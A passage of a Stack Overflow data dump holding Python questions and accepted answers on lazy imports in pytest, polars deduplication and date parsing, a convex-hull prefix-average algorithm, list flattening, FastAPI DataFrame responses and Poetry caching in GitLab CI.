    "Body": "I have a pytest fixture that imports a specific module. This is needed as importing the module is very expensive, so we don't want to do it on import-time (i.e. during pytest test collection). This results in code like this:\n@pytest.fixture\ndef my_module_fix():\n    import my_module\n    yield my_module\n\ndef test_something(my_module_fix):\n    assert my_module_fix.my_func() = 5\n\nI am using PyCharm and would like to have type-checking and autocompletion in my tests. To achieve that, I would somehow have to annotate the my_module_fix parameter as having the type of the my_module module.\nI have no idea how to achieve that. All I found is that I can annotate my_module_fix as being of type types.ModuleType, but that is not enough: It is not any module, it is always my_module.\n",
    "AcceptedAnswerId": 71680238,
    "AcceptedAnswer": "If I get your question, you have two (or three) separate goals\n\nDeferred import of slowmodule\nAutocomplete to continue to work as if it was a standard import\n(Potentially?) typing (e.g. mypy?) to continue to work\n\nI can think of at least five different approaches, though I'll only briefly mention the last because it's insane.\n\nImport the module inside your tests\nThis is (by far) the most common and IMHO preferred solution.\ne.g. instead of\nimport slowmodule\n\ndef test_foo():\n    slowmodule.foo()\n\ndef test_bar():\n    slowmodule.bar()\n\nyou'd write:\ndef test_foo():\n    import slowmodule\n    slowmodule.foo()\n\ndef test_bar():\n    import slowmodule\n    slowmodule.bar()\n\n\n[deferred importing] Here, the module will be imported on-demand/lazily.  So if you have pytest setup to fail-fast, and another test fails before pytest gets to your (test_foo, test_bar) tests, the module will never be imported and you'll never incur the runtime cost.\nBecause of Python's module cache, subsequent import statements won't actually re-import the module, just grab a reference to the already-imported module.\n\n[autocomplete/typing] Of course, autocomplete will continue to work as you expect in this case.  This is a perfectly fine import pattern.\n\n\nWhile it does require adding potentially many additional import statements (one inside each test function), it's immediately clear what is going on (regardless of whether it's clear why it's going on).\n\n[3.7+] Proxy your module with module __getattr__\nIf you create a module (e.g. slowmodule_proxy.py) with the contents like:\ndef __getattr__(name):\n    import slowmodule\n    return getattr(slowmodule, name)\n\nAnd in your tests, e.g.\nimport slowmodule\n\ndef test_foo():\n    slowmodule.foo()\n\ndef test_bar():\n    slowmodule.bar()\n\ninstead of:\nimport slowmodule\n\nyou write:\nimport slowmodule_proxy as slowmodule\n\n\n[deferred import] Thanks to PEP-562, you can \"request\" any name from slowmodule_proxy and it will fetch and return the corresponding name from slowmodule.  Just as above, including the import inside the function will cause slowmodule to be imported only when the function is called and executed instead of on module load.  Module caching still applies here of course, so you're only incurring the import penalty once per interpreter session.\n\n[autocomplete] However, while deferred importing will work (and your tests run without issue), this approach (as stated so far) will \"break\" autocomplete:\n\n\n\nNow we're in the realm of PyCharm.  Some IDEs will perform \"live\" analysis of modules and actually load up the module and inspect its members.  (PyDev had this option).  If PyCharm did this, implementing module.__dir__ (same PEP) or __all__ would allow your proxy module to masquerade as the actual slowmodule and autocomplete would work.\u2020  But, PyCharm does not do this.\nNonetheless, you can fool PyCharm into giving you autocomplete suggestions:\nif False:\n    import slowmodule\nelse:\n    import slowmodule_proxy as slowmodule\n\nThe interpreter will only execute the else branch, importing the proxy and naming it slowmodule (so your test code can continue to reference slowmodule unchanged).\nBut PyCharm will now provide autocompletion for the underlying module:\n\n\u2020 While live-analysis can be an incredibly helpful, there's also a (potential) security concern that comes with it that static syntax analysis doesn't have.  And the maturation of type hinting and stub files has made it less of an issue still.\n\nProxy slowmodule explicitly\nIf you really hated the dynamic proxy approach (or the fact that you have to fool PyCharm in this way), you could proxy the module explicitly.\n(You'd likely only want to consider this if the slowmodule API is stable.)\nIf slowmodule has methods foo and bar you'd create a proxy module  like:\ndef foo(*args, **kwargs):\n    import slowmodule\n    return slowmodule.foo(*args, **kwargs)\n\ndef bar(*args, **kwargs):\n    import slowmodule\n    return slowmodule.bar(*args, **kwargs)\n\n(Using args and kwargs to pass arguments through to the underlying callables.  And you could add type hinting to these functions to mirror the slowmodule functions.)\nAnd in your test,\nimport slowmodule_proxy as slowmodule\n\nSame as before.  Importing inside the method gives you the deferred importing you want and the module cache takes care of multiple import calls.\nAnd since it's a real module whose contents can be statically analyzed, there's no need to \"fool\" PyCharm.\nSo the benefit of this solution is that you don't have a bizarre looking if False in your test imports.  This, however, comes at the (substantial) cost of having to maintain a proxy file alongside your module -- which could prove painful in the case that slowmodule's API wasn't stable.\n\n[3.5+] Use importlib's LazyLoader instead of a proxy module\nInstead of the proxy module slowmodule_proxy, you could follow a pattern similar to the one shown in the importlib docs\n\n>>> import importlib.util\n>>> import sys\n>>> def lazy_import(name):\n...     spec = importlib.util.find_spec(name)\n...     loader = importlib.util.LazyLoader(spec.loader)\n...     spec.loader = loader\n...     module = importlib.util.module_from_spec(spec)\n...     sys.modules[name] = module\n...     loader.exec_module(module)\n...     return module\n...\n>>> lazy_typing = lazy_import(\"typing\")\n>>> #lazy_typing is a real module object,\n>>> #but it is not loaded in memory yet.\n\n\nYou'd still need to fool PyCharm though, so something like:\nif False:\n    import slowmodule\nelse:\n    slowmodule = lazy_import('slowmodule')\n\nwould be necessary.\nOutside of the single additional level of indirection on module member access (and the two minor version availability difference), it's not immediately clear to me what, if anything, there is to be gained from this approach over the previous proxy module method, however.\n\nUse importlib's Finder/Loader machinery to hook import (don't do this)\nYou could create a custom module Finder/Loader that would (only) hook your slowmodule import and, instead load, for example your proxy module.\nThen you could just import that \"importhook\" module before you imported slowmode in your tests, e.g.\nimport myimporthooks\nimport slowmodule\n\ndef test_foo():\n    ...\n\n(Here, myimporthooks would use importlib's finder and loader machinery to do something simlar to the importhook package but intercept and redirect the import attempt rather than just serving as an import callback.)\nBut this is crazy.  Not only is what you want (seemingly) achievable through (infinitely) more common and supported methods, but it's incredibly fragile, error-prone and, without diving into the internals of PyTest (which may mess with module loaders itself), it's hard to say whether it'd even work.\n"
}
{
    "Id": 71697019,
    "PostTypeId": 1,
    "Title": "generating list of every combination without duplicates",
    "Body": "I would like to generate a list of combinations. I will try to simplify my problem to make it understandable.\nWe have 3 variables :\n\nx : number of letters\nk : number of groups\nn : number of letters per group\n\nI would like to generate using python a list of every possible combinations, without any duplicate knowing that : i don't care about the order of the groups and the order of the letters within a group.\nAs an example, with x = 4, k = 2, n = 2 :\n# we start with 4 letters, we want to make 2 groups of 2 letters\nletters = ['A','B','C','D']\n\n# here would be a code that generate the list\n\n# Here is the result that is very simple, only 3 combinations exist.\ncombos = [ ['AB', 'CD'], ['AC', 'BD'], ['AD', 'BC'] ]\n\nSince I don't care about the order of or within the groups, and letters within a group, ['AB', 'CD'] and ['DC', 'BA'] is a duplicate.\nThis is a simplification of my real problem, which has those values : x = 12, k = 4, n = 3. I tried to use some functions from itertools, but with that many letters my computer freezes because it's too many combinations.\nAnother way of seeing the problem : you have 12 players, you want to make 4 teams of 3 players. What are all the possibilities ?\nCould anyone help me to find an optimized solution to generate this list?\n",
    "AcceptedAnswerId": 71699012,
    "AcceptedAnswer": "There will certainly be more sophisticated/efficient ways of doing this, but here's an approach that works in a reasonable amount of time for your example and should be easy enough to adapt for other cases.\nIt generates unique teams and unique combinations thereof, as per your specifications.\nfrom itertools import combinations\n\n# this assumes that team_size * team_num == len(players) is a given\nteam_size = 3\nteam_num = 4\nplayers = list('ABCDEFGHIJKL')\nunique_teams = [set(c) for c in combinations(players, team_size)]\n\ndef duplicate_player(combo):\n    \"\"\"Returns True if a player occurs in more than one team\"\"\"\n    return len(set.union(*combo)) < len(players)\n    \nresult = (combo for combo in combinations(unique_teams, team_num) if not duplicate_player(combo))\n\nresult is a generator that can be iterated or turned into a list with list(result). On kaggle.com, it takes a minute or so to generate the whole list of all possible combinations (a total of 15400, in line with the computations by @beaker and @John Coleman in the comments). The teams are tuples of sets that look like this:\n[({'A', 'B', 'C'}, {'D', 'E', 'F'}, {'G', 'H', 'I'}, {'J', 'K', 'L'}),\n ({'A', 'B', 'C'}, {'D', 'E', 'F'}, {'G', 'H', 'J'}, {'I', 'K', 'L'}),\n ({'A', 'B', 'C'}, {'D', 'E', 'F'}, {'G', 'H', 'K'}, {'I', 'J', 'L'}),\n ...\n]\n\nIf you want, you can cast them into strings by calling ''.join() on each of them.\n"
}
{
    "Id": 71196661,
    "PostTypeId": 1,
    "Title": "What is the equivalent of `DataFrame.drop_duplicates()` from pandas in polars?",
    "Body": "What is the equivalent of drop_duplicates() from pandas in polars?\nimport polars as pl\ndf = pl.DataFrame({\"a\":[1,1,2], \"b\":[2,2,3], \"c\":[1,2,3]})\ndf\n\nOutput:\nshape: (3, 3)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 a   \u2506 b   \u2506 c   \u2502\n\u2502 --- \u2506 --- \u2506 --- \u2502\n\u2502 i64 \u2506 i64 \u2506 i64 \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 1   \u2506 2   \u2506 1   \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 2   \u2506 2   \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 3   \u2506 3   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2518\n\nCode:\ndf.drop_duplicates([\"a\", \"b\"])\n\nDelivers the following error:\nAttributeError: drop_duplicates not found\n",
    "AcceptedAnswerId": 71196662,
    "AcceptedAnswer": "The right function name is .unique()\nimport polars as pl\ndf = pl.DataFrame({\"a\":[1,1,2], \"b\":[2,2,3], \"c\":[1,2,3]})\ndf.unique(subset=[\"a\",\"b\"])\n\nAnd this delivers the right output:\nshape: (2, 3)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 a   \u2506 b   \u2506 c   \u2502\n\u2502 --- \u2506 --- \u2506 --- \u2502\n\u2502 i64 \u2506 i64 \u2506 i64 \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 1   \u2506 2   \u2506 1   \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 3   \u2506 3   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2518\n\n"
}
{
    "Id": 71287550,
    "PostTypeId": 1,
    "Title": "Repeatedly removing the maximum average subarray",
    "Body": "I have an array of positive integers. For example:\n[1, 7, 8, 4, 2, 1, 4]\n\nA \"reduction operation\" finds the array prefix with the highest average, and deletes it. Here, an array prefix means a contiguous subarray whose left end is the start of the array, such as [1] or [1, 7] or [1, 7, 8] above. Ties are broken by taking the longer prefix.\nOriginal array:  [  1,   7,   8,   4,   2,   1,   4]\n\nPrefix averages: [1.0, 4.0, 5.3, 5.0, 4.4, 3.8, 3.9]\n\n-> Delete [1, 7, 8], with maximum average 5.3\n-> New array -> [4, 2, 1, 4]\n\nI will repeat the reduction operation until the array is empty:\n[1, 7, 8, 4, 2, 1, 4]\n^       ^\n[4, 2, 1, 4]\n^ ^\n[2, 1, 4]\n^       ^\n[]\n\nNow, actually performing these array modifications isn't necessary; I'm only looking for the list of lengths of prefixes that would be deleted by this process, for example, [3, 1, 3] above.\nWhat is an efficient algorithm for computing these prefix lengths?\n\nThe naive approach is to recompute all sums and averages from scratch in every iteration for an O(n^2) algorithm-- I've attached Python code for this below. I'm looking for any improvement on this approach-- most preferably, any solution below O(n^2), but an algorithm with the same complexity but better constant factors would also be helpful.\nHere are a few of the things I've tried (without success):\n\nDynamically maintaining prefix sums, for example with a Binary Indexed Tree. While I can easily update prefix sums or find a maximum prefix sum in O(log n) time, I haven't found any data structure which can update the average, as the denominator in the average is changing.\nReusing the previous 'rankings' of prefix averages-- these rankings can change, e.g. in some array, the prefix ending at index 5 may have a larger average than the prefix ending at index 6, but after removing the first 3 elements, now the prefix ending at index 2 may have a smaller average than the one ending at 3.\nLooking for patterns in where prefixes end; for example, the rightmost element of any max average prefix is always a local maximum in the array, but it's not clear how much this helps.\n\n\nThis is a working Python implementation of the naive, quadratic method:\nfrom fractions import Fraction\ndef find_array_reductions(nums: List[int]) -> List[int]:\n    \"\"\"Return list of lengths of max average prefix reductions.\"\"\"\n\n    def max_prefix_avg(arr: List[int]) -> Tuple[float, int]:\n        \"\"\"Return value and length of max average prefix in arr.\"\"\"\n        if len(arr) == 0:\n            return (-math.inf, 0)\n\n        best_length = 1\n        best_average = Fraction(0, 1)\n        running_sum = 0\n\n        for i, x in enumerate(arr, 1):\n            running_sum += x\n            new_average = Fraction(running_sum, i)\n            if new_average >= best_average:\n                best_average = new_average\n                best_length = i\n\n        return (float(best_average), best_length)\n\n    removed_lengths = []\n    total_removed = 0\n\n    while total_removed < len(nums):\n        _, new_removal = max_prefix_avg(nums[total_removed:])\n        removed_lengths.append(new_removal)\n        total_removed += new_removal\n\n    return removed_lengths\n\n\nEdit: The originally published code had a rare error with large inputs from using Python's math.isclose() with default parameters for floating point comparison, rather than proper fraction comparison. This has been fixed in the current code. An example of the error can be found at this Try it online link, along with a foreword explaining exactly what causes this bug, if you're curious.\n",
    "AcceptedAnswerId": 71288237,
    "AcceptedAnswer": "This problem has a fun O(n) solution.\nIf you draw a graph of cumulative sum vs index, then:\nThe average value in the subarray between any two indexes is the slope of the line between those points on the graph.\nThe first highest-average-prefix will end at the point that makes the highest angle from 0.  The next highest-average-prefix must then have a smaller average, and it will end at the point that makes the highest angle from the first ending.  Continuing to the end of the array, we find that...\nThese segments of highest average are exactly the segments in the upper convex hull of the cumulative sum graph.\nFind these segments using the monotone chain algorithm.  Since the points are already sorted, it takes O(n) time.\n# Lengths of the segments in the upper convex hull\n# of the cumulative sum graph\ndef upperSumHullLengths(arr):\n    if len(arr) < 2:\n        if len(arr) < 1:\n            return []\n        else:\n            return [1]\n    \n    hull = [(0, 0),(1, arr[0])]\n    for x in range(2, len(arr)+1):\n        # this has x coordinate x-1\n        prevPoint = hull[len(hull) - 1]\n        # next point in cumulative sum\n        point = (x, prevPoint[1] + arr[x-1])\n        # remove points not on the convex hull\n        while len(hull) >= 2:\n            p0 = hull[len(hull)-2]\n            dx0 = prevPoint[0] - p0[0]\n            dy0 = prevPoint[1] - p0[1]\n            dx1 = x - prevPoint[0]\n            dy1 = point[1] - prevPoint[1]\n            if dy1*dx0 < dy0*dx1:\n                break\n            hull.pop()\n            prevPoint = p0\n        hull.append(point)\n    \n    return [hull[i+1][0] - hull[i][0] for i in range(0, len(hull)-1)]\n\n\nprint(upperSumHullLengths([  1,   7,   8,   4,   2,   1,   4]))\n\nprints:\n[3, 1, 3]\n\n"
}
{
    "Id": 71758114,
    "PostTypeId": 1,
    "Title": "Python list comprehension with complex data structures",
    "Body": "I'm trying to flatten some mixed arrays in Python using LC. I'm having some trouble figuring out how to structure it.\nHere's the array's i'm trying to flatten\narr_1 = [1, [2, 3], 4, 5]\narr_2 = [1,[2,3],[[4,5]]]\n\nI tried this methods for arr_1 but get \"TypeError: 'int' object is not iterable\"\nprint([item if type(items) is list else items for items in arr_1 for item in items])\n\nSo I decided to break it into parts to see where it's failing by using this\ndef check(item):\nreturn item;\n\nprint([check(item) if type(items) is list else check(items) for items in [1, [2, 3], 4, 5] for items in arr_2]) \n\nThrough the debugger I found that it's failing at the 2d array in\nfor items in [1, [2, 3], 4, 5]\n\nI don't need the LC to be in one line but I just wanted to know how to do it in a single nested LC if its even possible.\n",
    "AcceptedAnswerId": 71758467,
    "AcceptedAnswer": "Using an internal stack and iter's second form to simulate a while loop:\ndef flatten(obj):\n    return [x\n            for stack in [[obj]]\n            for x, in iter(lambda: stack and [stack.pop()], [])\n            if isinstance(x, int)\n            or stack.extend(reversed(x))]\n\nprint(flatten([1, [2, 3], 4, 5]))\nprint(flatten([1, [2, 3], [[4, 5]]]))\nprint(flatten([1, [2, [], 3], [[4, 5]]]))\n\nOutput (Try it online!):\n[1, 2, 3, 4, 5]\n[1, 2, 3, 4, 5]\n[1, 2, 3, 4, 5]\n\nSlight variation, splitting the \"long\" line into two (Try it online!):\ndef flatten(obj):\n    return [x\n            for stack in [[obj]]\n            for _ in iter(lambda: stack, [])\n            for x in [stack.pop()]\n            if isinstance(x, int)\n            or stack.extend(reversed(x))]\n\nTo explain it a bit, here's roughly the same with ordinary code:\ndef flatten(obj):\n    result = []\n    stack = [obj]\n    while stack:\n        x = stack.pop()\n        if isinstance(x, int):\n            result.append(x)\n        else:\n            stack.extend(reversed(x))\n    return result\n\nIf the order doesn't matter, we can use a queue instead (inspired by 0x263A's comment), although it's less memory-efficient (Try it online!):\ndef flatten(obj):\n    return [x\n            for queue in [[obj]]\n            for x in queue\n            if isinstance(x, int) or queue.extend(x)]\n\nWe can fix the order if instead of putting each list's contents at the end of the queue, we insert them right after the list (which is less time-efficient) in the \"priority\" queue (Try it online!):\ndef flatten(obj):\n    return [x\n            for pqueue in [[obj]]\n            for i, x in enumerate(pqueue, 1)\n            if isinstance(x, int) or pqueue.__setitem__(slice(i, i), x)]\n\n"
}
{
    "Id": 71079342,
    "PostTypeId": 1,
    "Title": "How can I take comma separated inputs for python AnyTree module?",
    "Body": "Community. I need to accept multiple comma-separated inputs to produce a summary of information ( specifically, how many different employees participated in each group/project)? The program takes employees, managers and groups in the form of strings.\nI'm using anytree python library to be able to search/count the occurrence of each employee per group. However, this program is only accepting one value/cell at a time instead of multiple values. \nHere is the tree structure and how I accept input values?\nPress q to exit, Enter your data: Joe\nPress q to exit, Enter your data: Manager1\nPress q to exit, Enter your data: Group1\nPress q to exit, Enter your data: Charles \nPress q to exit, Enter your data: Manager1\nPress q to exit, Enter your data: Group2\nPress q to exit, Enter your data: Joe\nPress q to exit, Enter your data: Manager3\nPress q to exit, Enter your data: Group1\nPress q to exit, Enter your data: Charles\nPress q to exit, Enter your data: Manager3\nPress q to exit, Enter your data: Group1\nPress q to exit, Enter your data: Joe\nPress q to exit, Enter your data: Manager5\nPress q to exit, Enter your data: Group2\nPress q to exit, Enter your data: q\nEmployee   No of groups\n   JOE       2\n   CHARLES       2\nGroup\n\u251c\u2500\u2500 GROUP1\n\u2502   \u251c\u2500\u2500 JOE\n\u2502   \u2502   \u2514\u2500\u2500 MANAGER1\n\u2502   \u251c\u2500\u2500 JOE\n\u2502   \u2502   \u2514\u2500\u2500 MANAGER3\n\u2502   \u2514\u2500\u2500 CHARLES\n\u2502       \u2514\u2500\u2500 MANAGER3\n\u2514\u2500\u2500 GROUP2\n    \u251c\u2500\u2500 CHARLES\n    \u2502   \u2514\u2500\u2500 MANAGER1\n    \u2514\u2500\u2500 JOE\n        \u2514\u2500\u2500 MANAGER5\n\nI need help with this code so that It can accept comma-separated values; for example, to enter Joe, Manager1, Group1 at a time.\nimport anytree\n\nfrom anytree import Node, RenderTree, LevelOrderIter, LevelOrderGroupIter, PreOrderIter\n\nimport sys\n\n# user input\nio=''\nlst_input = []\nwhile (io!='q'):\n    io=input('Press q to exit, Enter your data: ')\n    if io!='q':\n        lst_input.append(io.upper())\n\n# change list in to matrix\nlst=[]\nfor i in range(0, len(lst_input), 3):\n    lst.append(lst_input[i:i + 3])\n\nlst\n\n# create tree structure from lst\ngroup = Node('Group')\nstoreGroup = {}\nfor i in range(len(lst)):\n    if lst[i][2] in [x.name for x in group.children]: # parent already exist, append childrens\n        storeGroup[lst[i][0]] = Node(lst[i][0], parent=storeGroup[lst[i][2]])\n        storeGroup[lst[i][1]] = Node(lst[i][1], parent=storeGroup[lst[i][0]])\n    else: # create parent and append childreds\n        storeGroup[lst[i][2]] = Node(lst[i][2], parent=group)\n        storeGroup[lst[i][0]] = Node(lst[i][0], parent=storeGroup[lst[i][2]])\n        storeGroup[lst[i][1]] = Node(lst[i][1], parent=storeGroup[lst[i][0]])\n\n\nstore = {}\nfor children in LevelOrderIter(group, maxlevel=3):\n    if children.parent!=None and children.parent.name!='Group':\n        if children.name not in store:\n            store[children.name] = {children.parent.name}\n        else:\n            store[children.name] = store[children.name] | {children.parent.name}\n\nprint('Employee', '  No of groups')\nfor i in store:\n    print('   '+i+'      ', len(store[i]))\n\n\nfor pre,fill, node in RenderTree(group):\n    print('{}{}'.format(pre,node.name))\n\n Thank you! Any thoughts are welcomed.\n",
    "AcceptedAnswerId": 71110010,
    "AcceptedAnswer": "Leverage unpacking to extract elements. Then the if statement can be re-written this way.\nif io!='q':\n    name, role, grp = io.upper(). split(',')\n    lst_input.append([name,role, grp]) \n\nyou also need to change lst.append(lst_input[i:i + 3]) in the for loop to this.\nlst.append(lst_input[0][i:i + 3])\n\n"
}
{
    "Id": 71203579,
    "PostTypeId": 1,
    "Title": "How to return a csv file/Pandas DataFrame in JSON format using FastAPI?",
    "Body": "I have a .csv file that I would like to render in a FastAPI app. I only managed to render the .csv file  in JSON format as follows:\ndef transform_question_format(csv_file_name):\n\n    json_file_name = f\"{csv_file_name[:-4]}.json\"\n\n    # transforms the csv file into json file\n    pd.read_csv(csv_file_name ,sep=\",\").to_json(json_file_name)\n\n    with open(json_file_name, \"r\") as f:\n        json_data = json.load(f)\n\n    return json_data\n\n@app.get(\"/questions\")\ndef load_questions():\n\n    question_json = transform_question_format(question_csv_filename)\n\n    return question_json\n\nWhen I tried returning directly pd.read_csv(csv_file_name ,sep=\",\").to_json(json_file_name), it works, as it returns a string.\nHow should I proceed?  I believe this is not the good way to do it.\n",
    "AcceptedAnswerId": 71205127,
    "AcceptedAnswer": "The below shows four different ways of returning the data stored in a .csv file/Pandas DataFrame (for solutions without using Pandas DataFrame, have a look here). Related answers on how to efficiently return a large dataframe can be found here and here as well.\nOption 1\nThe first option is to convert the file data into JSON and then parse it into a dict. You can optionally change the orientation of the data using the orient parameter in the .to_json() method.\nNote: Better not to use this option. See Updates below.\nfrom fastapi import FastAPI\nimport pandas as pd\nimport json\n\napp = FastAPI()\ndf = pd.read_csv(\"file.csv\")\n\ndef parse_csv(df):\n    res = df.to_json(orient=\"records\")\n    parsed = json.loads(res)\n    return parsed\n    \n@app.get(\"/questions\")\ndef load_questions():\n    return parse_csv(df)\n\n\nUpdate 1: Using .to_dict() method would be a better option, as it would return a dict directly, instead of converting the DataFrame into JSON (using df.to_json()) and then that JSON string into dict (using json.loads()), as described earlier. Example:\n@app.get(\"/questions\")\ndef load_questions():\n    return df.to_dict(orient=\"records\")\n\n\nUpdate 2: When using .to_dict() method and returning the dict, FastAPI, behind the scenes, automatically converts that return value into JSON, after converting it into JSON-compatible data first, using the jsonable_encoder, and then putting that JSON-compatible data inside of a JSONResponse (see this answer for more details). Thus, to avoid that extra processing, you could still use the .to_json() method, but this time, put the JSON string in a custom Response and return it directly, as shown below:\nfrom fastapi import Response\n\n@app.get(\"/questions\")\ndef load_questions():\n    return Response(df.to_json(orient=\"records\"), media_type=\"application/json\")\n\n\n\nOption 2\nAnother option is to return the data in string format, using .to_string() method.\n@app.get(\"/questions\")\ndef load_questions():\n    return df.to_string()\n\nOption 3\nYou could also return the data as an HTML table, using .to_html() method.\nfrom fastapi.responses import HTMLResponse\n\n@app.get(\"/questions\")\ndef load_questions():\n    return HTMLResponse(content=df.to_html(), status_code=200)\n\nOption 4\nFinally, you can always return the file as is using FastAPI's FileResponse.\nfrom fastapi.responses import FileResponse\n\n@app.get(\"/questions\")\ndef load_questions():\n    return FileResponse(path=\"file.csv\", filename=\"file.csv\")\n\n"
}
{
    "Id": 71295840,
    "PostTypeId": 1,
    "Title": "python pip: \"error: legacy-install-failure\"",
    "Body": "I want to install gensim python package via pip install gensim\nBut this error occurs and I have no idea what should I do to solve it.\n      running build_ext\n      building 'gensim.models.word2vec_inner' extension\n      error: Microsoft Visual C++ 14.0 or greater is required. Get it with \"Microsoft C++ Build Tools\": https://visualstudio.microsoft.com/visual-cpp-build-tools/\n      [end of output]\n\n  note: This error originates from a subprocess, and is likely not a problem with pip.\nerror: legacy-install-failure\n\n\u00d7 Encountered error while trying to install package.\n\u2570\u2500> gensim\n\nnote: This is an issue with the package mentioned above, not pip.\nhint: See above for output from the failure.\n\n",
    "AcceptedAnswerId": 71296224,
    "AcceptedAnswer": "If you fail to install plugins,\nyou can download it from other repositories like this one:\nrepository depends on the version of python and the system.\nfor example: for  windows 11(x64) and python 3.10 you should take this file: gensim\u20114.1.2\u2011cp310\u2011cp310\u2011win_amd64.whl\n"
}
{
    "Id": 71759316,
    "PostTypeId": 1,
    "Title": "Easily convert string column to pl.datetime in Polars",
    "Body": "Consider a Polars data frame with a column of str type that indicates the date in the format '27 July 2020'. I would like to convert this column to the polars.datetime type, which is distinct from the Python standard datetime. The following code, using the standard datetime format, works but Polars does not recognise the values in the column as dates.\nimport polars as pl\nfrom datetime import datetime\n\ndf = pd.read_csv('')\ndf = df.with_columns([   \n        pl.col('event_date').apply(lambda x: x.replace(\" \",\"-\"))\\\n                            .apply(lambda x: datetime.strptime(x, '%d-%B-%Y'))\n])\n\n\nSuppose we try to process df further to create a new column indicating the quarter of the year an event took place.\ndf = df.with_columns([\n        pl.col('event_date').apply(lambda x: x.month)\\\n                            .apply(lambda x: 1 if x in range(1,4) else 2 if x in range(4,7) else 3 if x in range(7,10) else 4)\\\n                            .alias('quarter')\n])\n\nThe code returns the following error because it qualifies event_type as dtype Object(\"object\") and not as datetime or polars.datetime\nthread '' panicked at 'dtype Object(\"object\") not supported', src/series.rs:992:24\n--- PyO3 is resuming a panic after fetching a PanicException from Python. ---\nPanicException: Unwrapped panic from Python code\n\n",
    "AcceptedAnswerId": 71759536,
    "AcceptedAnswer": "The easiest way to convert strings to Date/Datetime is to use Polars' own strptime function (rather than the same-named function from Python's datetime module).\nFor example, let's start with this data.\nimport polars as pl\n\ndf = pl.DataFrame({\n    'date_str': [\"27 July 2020\", \"31 December 2020\"]\n})\nprint(df)\n\nshape: (2, 1)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 date_str         \u2502\n\u2502 ---              \u2502\n\u2502 str              \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 27 July 2020     \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 31 December 2020 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nTo convert, use Polars' strptime function.\ndf.with_column(pl.col('date_str').str.strptime(pl.Date, fmt='%d %B %Y').cast(pl.Datetime))\n\nshape: (2, 1)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 date_str            \u2502\n\u2502 ---                 \u2502\n\u2502 datetime[\u03bcs]        \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 2020-07-27 00:00:00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2020-12-31 00:00:00 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nNotice that we did not need to replace spaces with dashes.  I've cast the result as a Datetime (per your question), but you may be able to use a Date instead.\nCurrently, the apply method does not work when the return type is a python Date/Datetime object, but there is a request for this.  That said, it's better to use Polars' strptime.  It will be much faster than calling python datetime code.\nEdit: as of Polars 0.13.19, the apply method will automatically convert Python date/datetime to Polars Date/Datetime.\n"
}
{
    "Id": 71239764,
    "PostTypeId": 1,
    "Title": "How to cache \"poetry install\" for Gitlab CI?",
    "Body": "Is there a way to cache poetry install command in Gitlab CI (.gitlab-ci.yml)?\nFor example, in node yarn there is a way to cache yarn install (https://classic.yarnpkg.com/lang/en/docs/install-ci/ Gitlab section) this makes stages a lot faster.\n",
    "AcceptedAnswerId": 71240277,
    "AcceptedAnswer": "GitLab can only cache things in the working directory and Poetry stores packages elsewhere by default:\n\nDirectory where virtual environments will be created. Defaults to {cache-dir}/virtualenvs ({cache-dir}\\virtualenvs on Windows).\n\nOn my machine, cache-dir is /home/chris/.cache/pypoetry.\nYou can use the virtualenvs.in-project option to change this behaviour:\n\nIf set to true, the virtualenv wil be created and expected in a folder named .venv within the root directory of the project.\n\nSo, something like this should work in your gitlab-ci.yml:\nbefore_script:\n  - poetry config virtualenvs.in-project true\n\ncache:\n  paths:\n    - .venv\n\n"
}
{
    "Id": 71111005,
    "PostTypeId": 1,
    "Title": "ModuleNotFoundError: No module named 'keras.applications.resnet50 on google colab",
